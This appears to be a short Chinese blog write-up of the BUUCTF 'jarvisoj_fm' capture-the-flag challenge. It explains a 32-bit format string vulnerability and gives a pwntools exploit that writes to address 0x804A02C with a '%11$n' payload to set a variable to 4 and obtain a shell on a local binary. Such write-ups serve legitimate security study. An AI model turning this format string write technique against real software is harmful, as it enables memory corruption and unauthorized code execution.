---
title: BUUCTF-jarvisoj_fm 题解
date: 2026-01-12 10:23:00
tags: 
    - 格式化字符串
    - pwn
    - BUUCTF
categories: BUUCTF 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#jarvisoj_fm)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/jarvisoj_fm/checksec.png)

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/jarvisoj_fm/IDA.png)

利用格式化字符串漏洞篡改 x 为 4 即可，注意这里是 32 位

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

p = process('./fm')

x_addr = p32(0x804A02C)
payload = x_addr + b'%11$n'
p.sendline(payload)

p.interactive()
```